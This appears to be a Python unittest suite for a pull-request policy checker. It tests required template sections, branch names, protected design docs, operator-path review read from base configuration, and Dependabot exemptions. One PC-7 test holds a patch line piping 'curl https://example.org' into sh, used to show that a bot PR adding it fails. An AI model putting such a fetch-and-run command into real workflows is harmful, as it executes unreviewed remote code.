import unittest

import helpers
from helpers import MemClient, body, fc, make_pr
from pr_contract import config, rules
from pr_contract.errors import ApiError, ConfigError, LimitExceeded

REPO_CONFIG = helpers.base_config()


def evaluate(pr, client=None, files=None):
    client = client or MemClient()
    if files is not None:
        client.files[pr.number] = files
    return rules.evaluate(pr, client, helpers.TEMPLATES)


def ids(violations):
    return {v.rule for v in violations}


def text(violations):
    return " | ".join(f"{v.rule}: {v.message}" for v in violations)


class PassingCases(unittest.TestCase):
    def test_each_type_passes_with_a_complete_body(self):
        for kind in ("design", "implementation", "change"):
            with self.subTest(kind=kind):
                violations = evaluate(make_pr(kind), files=[fc("docs/x.md")] if kind == "design" else [fc("scripts/x")])
                self.assertEqual(violations, [], text(violations))


class PC1(unittest.TestCase):
    def test_missing_empty_and_comment_only_sections_fail(self):
        for kind in helpers.TYPES:
            for heading in helpers.headings(kind):
                for mode in ("omit", "empty", "comment_only"):
                    with self.subTest(kind=kind, heading=heading, mode=mode):
                        top = helpers.IMPL_TOP if kind == "implementation" else ""
                        pr = make_pr(kind, body=body(kind, top=top, **{mode: (heading,)}))
                        files = [fc("docs/x.md")] if kind == "design" else [fc("scripts/x")]
                        violations = [v for v in evaluate(pr, files=files) if v.rule == "PC-1"]
                        self.assertTrue(violations)
                        self.assertIn(heading, violations[0].message)

    def test_heading_inside_a_fence_or_comment_does_not_count(self):
        sections = {"Summary": "```\n## Validation\nfake\n```"}
        pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP, omit=("Validation",), sections=sections))
        self.assertIn("PC-1", ids(evaluate(pr)))
        hidden = body("implementation", top=helpers.IMPL_TOP, omit=("Validation",),
                      extra="<!--\n## Validation\nfake\n-->")
        self.assertIn("PC-1", ids(evaluate(make_pr(body=hidden))))

    def test_template_placeholder_body_fails(self):
        raw = (helpers.TEMPLATES / "implementation.md").read_text()
        self.assertIn("PC-1", ids(evaluate(make_pr(body=raw))))

    def test_checkbox_state_is_ignored(self):
        sections = {"Checkpoint": "- [x] done\n- [ ] not done"}
        pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP, sections=sections))
        self.assertEqual(evaluate(pr), [])

    def test_null_body_fails_closed(self):
        self.assertIn("PC-1", ids(evaluate(make_pr(body=""))))

    def test_oversized_body_fails(self):
        pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP) + "x" * 70000)
        self.assertIn("too large", text(evaluate(pr)))

    def test_too_many_lines_fails(self):
        pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP) + "\n" * 6000)
        self.assertIn("too large", text(evaluate(pr)))


class PC2(unittest.TestCase):
    def test_unknown_prefix_fails(self):
        for head in ("feature/x", "main", "impl/x", "design/CR-x-y", "Impl/CR-2-x", "impl/CR-2-", "", "infra/x", "toolchain/x",
                     "template-sync/1.2.0", "template-sync/v1.2", "template-sync/v1.2.3.4", "template-sync/v1.2.x",
                     "init/1.0.0", "init/v1", "init/v1.0.0-rc1", "Init/v1.0.0", "template-sync/v1.2.3/extra"):
            with self.subTest(head=head):
                self.assertIn("PC-2", ids(evaluate(make_pr(head_ref=head))))

    def test_missing_marker_fails(self):
        pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP, marker=False))
        self.assertIn("marker", text(evaluate(pr)))

    def test_marker_and_branch_mismatch_fails(self):
        pr = make_pr("change", body=body("init"))
        self.assertIn("does not match", text(evaluate(pr)))

    def test_branch_number_must_match_the_referenced_issue(self):
        self.assertIn("PC-2", ids(evaluate(make_pr(head_ref="impl/CR-5-thing"))))
        self.assertIn("PC-2", ids(evaluate(make_pr("design", head_ref="design/CR-5-thing"), files=[fc("docs/x.md")])))

    def test_design_without_issue_reference_fails(self):
        pr = make_pr("design", body=body("design", sections={"Change request": "no reference here"}))
        self.assertIn("PC-2", ids(evaluate(pr, files=[fc("docs/x.md")])))

    def test_dependabot_branch_from_a_human_is_not_exempt(self):
        pr = make_pr(head_ref="dependabot/pip/x", author="someone")
        self.assertIn("PC-2", ids(evaluate(pr)))

    def test_bot_author_on_a_normal_branch_is_not_exempt(self):
        pr = make_pr(author="dependabot[bot]", body="")
        self.assertIn("PC-1", ids(evaluate(pr)))


class PC3(unittest.TestCase):
    def impl(self, top, **kw):
        return make_pr(body=body("implementation", top=top), **kw)

    def test_missing_references_fail(self):
        self.assertIn("Implements", text(evaluate(self.impl("Design: #3"))))
        self.assertIn("Design", text(evaluate(self.impl("Implements: #2"))))

    def test_issue_must_exist_and_not_be_a_pr(self):
        client = MemClient(issues={2: "pull_request"})
        self.assertIn("pull request, not an issue", text(evaluate(make_pr(), client)))
        client = MemClient()
        del client.issues[2]
        self.assertIn("not found", text(evaluate(make_pr(), client)))

    def test_design_pr_must_exist(self):
        client = MemClient()
        del client.prs[3]
        self.assertIn("design PR #3 not found", text(evaluate(make_pr(), client)))

    def test_design_pr_must_be_merged(self):
        client = MemClient(prs={3: make_pr("design", number=3, merged=False, state="open")})
        self.assertIn("not merged", text(evaluate(make_pr(), client)))

    def test_design_pr_must_target_the_same_base(self):
        client = MemClient(prs={3: make_pr("design", number=3, merged=True, base_ref="other")})
        self.assertIn("base branch", text(evaluate(make_pr(), client)))

    def test_design_pr_must_be_a_design_branch_of_the_same_issue(self):
        for head in ("impl/CR-2-x", "design/CR-9-x", "change/x"):
            with self.subTest(head=head):
                client = MemClient(prs={3: make_pr("design", number=3, merged=True, head_ref=head)})
                self.assertIn("not a design branch", text(evaluate(make_pr(), client)))

    def test_design_pr_must_reference_the_issue_in_its_change_request(self):
        other = body("design", sections={"Change request": "CR: #9"})
        client = MemClient(prs={3: make_pr("design", number=3, merged=True, body=other)})
        self.assertIn("Change request", text(evaluate(make_pr(), client)))
        elsewhere = body("design", sections={"Change request": "none", "Summary": "mentions #2 here"})
        client = MemClient(prs={3: make_pr("design", number=3, merged=True, body=elsewhere)})
        self.assertIn("Change request", text(evaluate(make_pr(), client)))

    def test_design_reference_to_itself_fails(self):
        pr = self.impl("Implements: #2\nDesign: #10")
        client = MemClient(prs={10: make_pr(number=10)})
        self.assertIn("this PR", text(evaluate(pr, client)))

    def test_only_implementation_prs_are_checked(self):
        self.assertEqual(evaluate(make_pr("change"), files=[fc("scripts/x")]), [])


class PC4(unittest.TestCase):
    def test_design_pr_may_only_touch_docs(self):
        pr = make_pr("design")
        self.assertEqual(evaluate(pr, files=[fc("docs/a.md"), fc("docs/cr/CR-2/design.md")]), [])
        self.assertIn("PC-4", ids(evaluate(pr, files=[fc("docs/a.md"), fc("scripts/x.sh")])))
        self.assertIn("PC-4", ids(evaluate(pr, files=[fc("README.md")])))
        self.assertIn("PC-4", ids(evaluate(pr, files=[fc("docsx/a.md")])))

    def test_rename_source_is_checked(self):
        pr = make_pr("design")
        self.assertIn("PC-4", ids(evaluate(pr, files=[fc("docs/new.md", "renamed", previous="scripts/old.sh")])))

    def test_not_applied_to_other_types(self):
        self.assertNotIn("PC-4", ids(evaluate(make_pr(), files=[fc("scripts/x")])))


class PC5(unittest.TestCase):
    PROTECTED = ("docs/cr/CR-2/design.md", "docs/cr/CR-9/acceptance-criteria.md", "docs/adr/ADR-001-x.md",
                 "docs/adr/sub/new.md")

    def test_protected_files_fail_for_implementation_and_change(self):
        for kind in ("implementation", "change"):
            for path in self.PROTECTED:
                for status in ("added", "modified", "removed"):
                    with self.subTest(kind=kind, path=path, status=status):
                        self.assertIn("PC-5", ids(evaluate(make_pr(kind), files=[fc(path, status)])))

    def test_rename_source_is_checked(self):
        pr = make_pr("implementation")
        self.assertIn("PC-5", ids(evaluate(pr, files=[fc("docs/other.md", "renamed", previous="docs/cr/CR-2/design.md")])))
        self.assertIn("PC-5", ids(evaluate(pr, files=[fc("docs/adr/x.md", "renamed", previous="docs/y.md")])))

    def test_other_docs_are_fine(self):
        for path in ("docs/README.md", "docs/cr/CR-2/README.md", "docs/cr/CR-2/implementation-plan.md",
                     "docs/cr/CR-2/sub/design.md", "docs/operations/x.md"):
            with self.subTest(path=path):
                self.assertNotIn("PC-5", ids(evaluate(make_pr(), files=[fc(path)])))

    def test_design_prs_may_change_them(self):
        self.assertEqual(evaluate(make_pr("design"), files=[fc("docs/cr/CR-2/design.md"), fc("docs/adr/x.md")]), [])


class PC6(unittest.TestCase):
    JUSTIFICATION = "Workflow change justification"

    def test_workflow_change_needs_the_section(self):
        for path in (".github/workflows/ci.yml", ".github/actions/x/action.yml"):
            with self.subTest(path=path):
                self.assertIn("PC-6", ids(evaluate(make_pr(), files=[fc(path)])))

    def test_section_present_and_non_empty_passes(self):
        pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP,
                               extra=f"## {self.JUSTIFICATION}\nWhat, why, risk."))
        self.assertEqual(evaluate(pr, files=[fc(".github/workflows/ci.yml")]), [])

    def test_empty_or_comment_only_section_fails(self):
        for content in ("", "<!-- nothing -->"):
            with self.subTest(content=content):
                pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP, extra=f"## {self.JUSTIFICATION}\n{content}"))
                self.assertIn("PC-6", ids(evaluate(pr, files=[fc(".github/workflows/ci.yml")])))

    def test_section_inside_a_fence_does_not_count(self):
        pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP,
                               extra=f"```\n## {self.JUSTIFICATION}\ntext\n```"))
        self.assertIn("PC-6", ids(evaluate(pr, files=[fc(".github/workflows/ci.yml")])))

    def test_rename_out_of_workflows_counts(self):
        pr = make_pr()
        self.assertIn("PC-6", ids(evaluate(pr, files=[fc("scripts/ci.yml", "renamed", previous=".github/workflows/ci.yml")])))

    def test_no_workflow_change_needs_nothing(self):
        self.assertNotIn("PC-6", ids(evaluate(make_pr(), files=[fc(".github/PULL_REQUEST_TEMPLATE/x.md")])))


class PC8(unittest.TestCase):
    SECTION = "Operator script review"
    PATHS = ("scripts/operator/lib/modes.py", "scripts/operator/setup", "scripts/operator/machine-profiles.toml",
             "ansible/operator.yml", "ansible/roles/operator_hardening/tasks/main.yml",
             "toolchain/python/operator.lock")
    LOOKALIKES = ("scripts/operators/x.py", "scripts/operator", "scripts/Operator/x.py", "docs/scripts/operator/x.py",
                  "ansible/operator.yaml", "ansible/roles/operator/tasks/main.yml", "ansible/roles/builder_x/tasks/main.yml",
                  "ansible/site.yml", "toolchain/python/builder.lock", "docs/operations/operator.md")

    def judge(self, pr, files=None):
        """The old behaviour, now read from this repository's own configuration at `config/project.yaml`."""
        return evaluate(pr, MemClient(config=REPO_CONFIG), files=files)

    def pr(self, kind="implementation", **kw):
        top = helpers.IMPL_TOP if kind == "implementation" else ""
        return make_pr(kind, body=body(kind, top=top, **kw))

    def test_operator_change_without_the_section_fails(self):
        for path in self.PATHS:
            with self.subTest(path=path):
                violations = self.judge(self.pr(), files=[fc(path)])
                self.assertIn("PC-8", ids(violations), text(violations))

    def test_every_pr_type_needs_the_section(self):
        for kind in ("implementation", "change", "template-sync", "init"):
            with self.subTest(kind=kind):
                self.assertIn("PC-8", ids(self.judge(self.pr(kind), files=[fc("scripts/operator/setup")])))

    def test_empty_or_comment_only_section_fails(self):
        for content in ("", "<!-- nothing -->", "   "):
            with self.subTest(content=content):
                pr = self.pr(extra=f"## {self.SECTION}\n{content}")
                self.assertIn("PC-8", ids(self.judge(pr, files=[fc("scripts/operator/setup")])))

    def test_section_inside_a_fence_does_not_count(self):
        pr = self.pr(extra=f"```\n## {self.SECTION}\ntext\n```")
        self.assertIn("PC-8", ids(self.judge(pr, files=[fc("scripts/operator/setup")])))

    def test_non_empty_section_passes(self):
        for path in self.PATHS:
            with self.subTest(path=path):
                pr = self.pr(extra=f"## {self.SECTION}\nCredentials: none. Commands: none. Modes: dry run default.")
                self.assertEqual(self.judge(pr, files=[fc(path)]), [])

    def test_no_operator_change_needs_nothing(self):
        for path in self.LOOKALIKES:
            with self.subTest(path=path):
                self.assertNotIn("PC-8", ids(self.judge(self.pr(), files=[fc(path)])))
        pr = self.pr(extra=f"## {self.SECTION}\nPresent but not needed.")
        self.assertEqual(self.judge(pr, files=[fc("docs/README.md")]), [])

    def test_rename_source_counts(self):
        renamed = fc("scripts/other/setup", "renamed", previous="scripts/operator/setup")
        self.assertIn("PC-8", ids(self.judge(self.pr(), files=[renamed])))

    def test_design_pr_is_checked_too(self):
        pr = make_pr("design")
        self.assertIn("PC-8", ids(self.judge(pr, files=[fc("scripts/operator/setup")])))

    def test_message_names_the_rule_and_section_and_no_pr_text(self):
        canary = "CANARY-PR-TEXT-5f3a"
        pr = self.pr(extra=f"## {self.SECTION}\n", sections={"Summary": canary})
        violations = [v for v in self.judge(pr, files=[fc("scripts/operator/setup")]) if v.rule == "PC-8"]
        self.assertEqual(len(violations), 1)
        self.assertIn(self.SECTION, violations[0].message)
        self.assertNotIn(canary, text(violations))
        self.assertNotIn("scripts/operator", text(violations))

    def test_section_is_not_a_required_template_heading(self):
        for kind in helpers.TYPES:
            with self.subTest(kind=kind):
                self.assertNotIn(self.SECTION, helpers.headings(kind))

    def test_templates_carry_the_hint_except_design(self):
        for kind in helpers.TYPES:
            with self.subTest(kind=kind):
                has = f'"{self.SECTION}" (PC-8)' in "\n".join(helpers.template_lines(kind))
                self.assertEqual(has, kind != "design")

    def test_a_template_body_still_passes_pc1_without_the_section(self):
        for kind in ("change",):
            with self.subTest(kind=kind):
                self.assertEqual(self.judge(make_pr(kind), files=[fc("README.md")]), [])


class PC8FromConfig(unittest.TestCase):
    """PC-8 reads `operator_paths` from the configuration of the BASE commit (the contract PC-8, ADR-009 decision 14, CR-57 PA-A6)."""

    SECTION = "Operator script review"
    KEY = "operator_paths"

    def run_with(self, config_value, files, **kw):
        if isinstance(config_value, dict) and "architectures" not in config_value:
            config_value = dict(config_value, architectures=helpers.ARCHITECTURES_SAMPLE)  # PC-9 has no default: keep it quiet here
        client = MemClient(config=config_value)
        return evaluate(make_pr(**kw), client, files=files), client

    def pc8(self, violations):
        return [v for v in violations if v.rule == "PC-8"]

    def test_the_hardcoded_sets_are_gone(self):
        self.assertFalse(hasattr(rules, "OPERATOR_PREFIXES"))
        self.assertFalse(hasattr(rules, "OPERATOR_PATHS"))

    def test_configured_paths_are_active_and_the_old_set_is_not(self):
        cfg = {"workflow": {"operator_paths": ["tools/ops/", "deploy/run.yml"]}}
        for path in ("tools/ops/a/b.py", "deploy/run.yml"):
            with self.subTest(path=path):
                found, _ = self.run_with(cfg, [fc(path)])
                self.assertEqual(len(self.pc8(found)), 1, text(found))
        for path in ("scripts/operator/setup", "ansible/operator.yml", "tools/other.py", "deploy/run.yml.bak"):
            with self.subTest(path=path):
                found, _ = self.run_with(cfg, [fc(path)])
                self.assertEqual(found, [], text(found))

    def test_a_non_empty_section_satisfies_a_configured_path(self):
        pr = make_pr(body=body("implementation", top=helpers.IMPL_TOP, extra=f"## {self.SECTION}\nCredentials: none."))
        client = MemClient(config=helpers.base_config(paths=["tools/ops/"]), files={10: [fc("tools/ops/x.py")]})
        self.assertEqual(rules.evaluate(pr, client, helpers.TEMPLATES), [])

    def test_matching_rule_exact_file_or_prefix(self):
        # An entry matches an exact path, or a prefix when it ends with `/` or `*/` (`*/` drops the star: the old
        # "ansible/roles/operator_" prefix). Case-sensitive. Nothing else matches.
        cfg = {"workflow": {"operator_paths": ["ansible/lab.yml", "scripts/operator/", "ansible/roles/operator_*/"]}}
        hits = ("ansible/lab.yml", "scripts/operator/setup", "scripts/operator/lib/x.py", "ansible/roles/operator_ssh/tasks/main.yml",
                "ansible/roles/operator_/x", "ansible/roles/operator_x")
        misses = ("ansible/lab.yml.bak", "ansible/lab.yaml", "ansible/Lab.yml", "scripts/operator", "scripts/operators/x.py",
                  "scripts/Operator/x.py", "docs/scripts/operator/x.py", "ansible/roles/operator/tasks/main.yml",
                  "ansible/roles/Operator_x/a", "x/ansible/lab.yml")
        for path in hits:
            with self.subTest(hit=path):
                found, _ = self.run_with(cfg, [fc(path)])
                self.assertEqual(len(self.pc8(found)), 1, text(found))
        for path in misses:
            with self.subTest(miss=path):
                found, _ = self.run_with(cfg, [fc(path)])
                self.assertEqual(self.pc8(found), [], text(found))

    def test_an_explicit_empty_value_makes_pc8_inactive(self):
        for path in ("scripts/operator/setup", "ansible/operator.yml", "toolchain/python/operator.lock"):
            with self.subTest(path=path):
                found, _ = self.run_with({"workflow": {"operator_paths": []}}, [fc(path)])
                self.assertEqual(found, [], text(found))

    def test_a_missing_key_fails_closed_naming_the_key(self):
        cases = {"no file": None, "empty mapping": {}, "other keys only": {"architectures": [], "schema_version": 1},
                 "workflow without the key": {"workflow": {"design_repos": []}}, "workflow not a mapping": {"workflow": []}}
        for name, cfg in cases.items():
            with self.subTest(case=name):
                for files in ([fc("scripts/operator/setup")], [fc("README.md")]):  # a violation even when nothing is touched
                    found, _ = self.run_with(cfg, files)
                    violations = self.pc8(found)
                    self.assertEqual(len(violations), 1, text(found))
                    self.assertIn(self.KEY, violations[0].message)

    def test_a_malformed_key_fails_closed_naming_the_key(self):
        bad = {
            "a string": "scripts/operator/", "null": None, "a mapping": {"a": "b"}, "a number": 5, "a bool": True,
            "entry not a string": ["scripts/operator/", 5], "entry null": [None], "nested list": [["a/"]],
            "empty entry": [""], "blank entry": [" "], "star only": ["*/"], "slash only": ["/"], "absolute": ["/etc/x"],
            "dot dot": ["a/../b"], "star in the middle": ["a/*/b"], "star at the end": ["scripts/*"], "glob": ["scripts/**/x"],
            "space inside": ["scripts/op erator/"], "newline": ["a\nb"], "backslash": ["a\\b"], "duplicate": ["a/", "a/"],
            "uppercase star": ["a/*"], "too long": ["a" * 300],
        }
        for name, value in bad.items():
            with self.subTest(case=name):
                found, _ = self.run_with({"workflow": {"operator_paths": value}}, [fc("scripts/operator/setup")])
                violations = self.pc8(found)
                self.assertEqual(len(violations), 1, text(found))
                self.assertIn(self.KEY, violations[0].message)

    def test_an_unreadable_base_file_fails_closed(self):
        found, _ = self.run_with(ConfigError("operator_paths key is repeated"), [fc("README.md")])
        violations = self.pc8(found)
        self.assertEqual(len(violations), 1, text(found))
        self.assertIn(self.KEY, violations[0].message)

    def test_an_api_error_is_not_a_pass(self):
        with self.assertRaises(ApiError):
            self.run_with(ApiError("boom"), [fc("README.md")])

    def test_the_message_is_fixed_text(self):
        found, _ = self.run_with(None, [fc("README.md")])
        self.assertEqual(self.pc8(found)[0].message, "operator_paths missing or invalid in the base configuration")

    def test_a_deleted_path_is_counted(self):
        found, _ = self.run_with(helpers.operator_config(), [fc("scripts/operator/lib/old.py", "removed")])
        self.assertEqual(len(self.pc8(found)), 1, text(found))

    def test_a_renamed_path_is_counted_from_either_side(self):
        for new, old in (("docs/x.md", "scripts/operator/setup"), ("scripts/operator/setup", "docs/x.md")):
            with self.subTest(new=new, old=old):
                found, _ = self.run_with(helpers.operator_config(), [fc(new, "renamed", previous=old)])
                self.assertEqual(len(self.pc8(found)), 1, text(found))

    def test_only_the_base_commit_is_read_and_a_head_edit_changes_nothing(self):
        # The head edits config/project.yaml (it would empty the key); the client returns the base value, and PC-8 holds.
        client = MemClient(config=helpers.operator_config(), files={10: [fc("scripts/operator/setup"), fc("config/project.yaml")]})
        found = rules.evaluate(make_pr(), client, helpers.TEMPLATES)
        self.assertEqual(len(self.pc8(found)), 1, text(found))
        self.assertEqual([c for c in client.calls if c[0] == "base_config"], [("base_config", helpers.BASE_SHA)])

    def test_the_file_is_read_once_when_pc9_reads_it_too(self):
        client = MemClient(config=helpers.operator_config(), files={10: [fc("scripts/x")]})
        rules.evaluate(make_pr(), client, helpers.TEMPLATES)  # an implementation PR: PC-8 and PC-9 both need the file
        self.assertEqual(client.calls.count(("base_config", helpers.BASE_SHA)), 1)

    def test_a_dependabot_pr_reads_nothing(self):
        client = MemClient(config=None, files={10: [fc("requirements.txt")]})
        pr = make_pr(author="dependabot[bot]", head_ref="dependabot/pip/x", body="")
        self.assertEqual(rules.evaluate(pr, client, helpers.TEMPLATES), [])
        self.assertEqual([c for c in client.calls if c[0] == "base_config"], [])

    def test_too_many_files_still_reports_only_the_file_limit(self):
        pr = make_pr(changed_files=rules.MAX_FILES)
        found = rules.evaluate(pr, MemClient(), helpers.TEMPLATES)
        self.assertEqual(ids(found), {"PC-*"})

    def test_a_malformed_key_does_not_hide_a_pc9_verdict_and_vice_versa(self):
        cfg = {"workflow": {"operator_paths": "x"}, "architectures": [{"name": "arm64"}]}
        found, _ = self.run_with(cfg, [fc("scripts/x")], body=body("implementation", top=helpers.IMPL_TOP, sections={"Architecture evidence": "n/a"}))
        self.assertEqual(ids(found), {"PC-8", "PC-9"}, text(found))

    def test_this_repositorys_own_configuration_is_readable_by_every_reader(self):
        parsed = config.parse_yaml((helpers.ROOT / "config" / "project.yaml").read_text())
        self.assertIsInstance(config.operator_paths(parsed), tuple)
        self.assertTrue(config.design_repos(parsed))
        self.assertTrue(config.architectures(parsed))


USES_PATCH = ("@@ -10,7 +10,7 @@ jobs:\n steps:\n"
              "-      - uses: actions/checkout@" + "a" * 40 + " # v7.0.1\n"
              "+      - uses: actions/checkout@" + "b" * 40 + " # v7.0.2\n with:\n")


def bot_pr(**over):
    base = dict(author="dependabot[bot]", head_ref="dependabot/github_actions/actions/checkout-7", body="Bumps a dependency.")
    base.update(over)
    return make_pr(**base)


class PC7(unittest.TestCase):
    def test_uses_only_workflow_change_passes(self):
        self.assertEqual(evaluate(bot_pr(), files=[fc(".github/workflows/ci.yml", patch=USES_PATCH)]), [])

    def test_manifests_and_lockfiles_pass(self):
        files = [fc("toolchain/python/ci.lock", patch="@@ -1 +1 @@\n-a\n+b\n"), fc("requirements.txt"),
                 fc("sub/requirements-dev.txt"), fc("package-lock.json"), fc("go.sum")]
        self.assertEqual(evaluate(bot_pr(), files=files), [])

    def test_only_the_ci_lock_is_a_manifest_path(self):
        self.assertEqual(rules.MANIFEST_PATHS, frozenset({"toolchain/python/ci.lock"}))
        files = [fc("toolchain/python/builder.lock", patch="@@ -1 +1 @@\n-a\n+b\n")]
        self.assertIn("PC-7", ids(evaluate(bot_pr(), files=files)))

    def test_other_operator_paths_still_fail_pc7(self):
        for path in ("scripts/operator/setup", "ansible/operator.yml", "ansible/roles/operator_x/tasks/main.yml"):
            with self.subTest(path=path):
                self.assertIn("PC-7", ids(evaluate(bot_pr(), files=[fc(path)])))

    def test_exemption_skips_pc1_to_pc3(self):
        self.assertEqual(evaluate(bot_pr(body=""), files=[fc("requirements.txt")]), [])

    def test_other_changes_fail(self):
        for path in ("scripts/pr-contract", "docs/README.md", "README.md", ".github/dependabot.yml"):
            with self.subTest(path=path):
                self.assertIn("PC-7", ids(evaluate(bot_pr(), files=[fc(path)])))

    def test_workflow_change_beyond_uses_fails(self):
        patch = USES_PATCH + "+      - run: curl https://example.org | sh\n"
        self.assertIn("PC-7", ids(evaluate(bot_pr(), files=[fc(".github/workflows/ci.yml", patch=patch)])))
        patch = "@@ -1 +1 @@\n-name: a\n+name: b\n"
        self.assertIn("PC-7", ids(evaluate(bot_pr(), files=[fc(".github/workflows/ci.yml", patch=patch)])))

    def test_missing_patch_fails_closed(self):
        self.assertIn("patch unavailable", text(evaluate(bot_pr(), files=[fc(".github/workflows/ci.yml")])))

    def test_added_removed_or_renamed_workflow_fails(self):
        for status in ("added", "removed"):
            with self.subTest(status=status):
                self.assertIn("PC-7", ids(evaluate(bot_pr(), files=[fc(".github/workflows/ci.yml", status, patch=USES_PATCH)])))
        renamed = fc(".github/workflows/new.yml", "renamed", previous=".github/workflows/ci.yml", patch=USES_PATCH)
        self.assertIn("PC-7", ids(evaluate(bot_pr(), files=[renamed])))

    def test_rename_source_must_be_allowed_too(self):
        self.assertIn("PC-7", ids(evaluate(bot_pr(), files=[fc("requirements.txt", "renamed", previous="scripts/x.py")])))

    def test_bot_with_no_files_fails_closed(self):
        self.assertIn("PC-7", ids(evaluate(bot_pr(), files=[])))


class Limits(unittest.TestCase):
    def test_file_cap_fails_closed(self):
        class Capped(MemClient):
            def pull_files(self, number):
                raise LimitExceeded("cap")

        self.assertIn("too many changed files", text(evaluate(make_pr("design"), Capped())))

    def test_changed_files_count_at_the_cap_fails_closed(self):
        self.assertIn("too many changed files", text(evaluate(make_pr(changed_files=3000), files=[])))

    def test_api_errors_propagate(self):
        with self.assertRaises(ApiError):
            evaluate(make_pr(), MemClient(fail=ApiError("boom")))


if __name__ == "__main__":
    unittest.main()
